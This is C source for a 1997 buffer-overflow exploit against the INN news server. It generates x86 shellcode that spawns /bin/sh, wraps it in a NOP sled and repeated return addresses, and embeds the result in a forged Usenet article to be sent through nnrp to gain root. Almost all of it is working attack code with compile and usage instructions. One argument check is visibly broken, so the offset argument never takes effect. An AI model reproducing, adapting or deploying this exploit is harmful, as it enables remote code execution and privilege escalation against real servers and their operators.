    /*
     * This just  generates the x86  shellcode and puts  it in a  file
     * that nnrp  can send. The  offset and/or esp  may need changing.
     * To  compile  on  most  systems:  cc innbuf.c -o innbuf.  Usage:
     * innbuf [offset] > file.  (C) 1997 by Method <method@arena.cwnet.com>
     * P.S.  Feel free to port this to other OS's.
     */
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/types.h>

    #define DEFAULT_OFFSET  792
    #define BUFFER_SIZE     796
    #define ADDRS           80

    u_long get_esp()
    {
	    return(0xefbf95e4);
    }

    int main(int argc, char **argv)
    {
	    char *buff = NULL;
	    u_long *addr_ptr = NULL;
	    char *ptr = NULL;
	    int ofs = DEFAULT_OFFSET;
	    int noplen;
	    u_long addr;
	    int i;
	    u_char execshell[] =
		    "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
		    "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
		    "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
		    "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";

	    if(argc < 1)
		    ofs = atoi(argv[1]);

	    addr = get_esp() - ofs;

	    if(!(buff = malloc(4096))) {
		    fprintf(stderr, "can't allocate memory\n");
		    exit(1);
	    }
	    ptr = buff;
	    noplen = BUFFER_SIZE - strlen(execshell) - ADDRS;
	    memset(ptr, 0x90, noplen);
	    ptr += noplen;
	    for(i = 0; i < strlen(execshell); i++)
		    *ptr++ = execshell[i];
	    addr_ptr = (unsigned long *)ptr;
	    for(i = 0; i < ADDRS / 4; i++)
		    *addr_ptr++ = addr;
	    ptr = (char *)addr_ptr;
	    *ptr = '\0';

	    printf(
		    "Path: dev.null!nntp\n"
		    "From: devNull @%s\n"
		    "Newsgroups: alt.test\n"
		    "Subject: 4 out of 5 Dweebs prefer INND for getting r00t\n"
		    "Message-ID: <830201540.9220@dev.null.com>\n"
		    "Date: 9 Jun 1997 15:15:15 GMT\n"
		    "Lines: 1\n"
		    "\n"
		    "this line left not left intentionally blank\n"
		    ".\n", buff);
    }
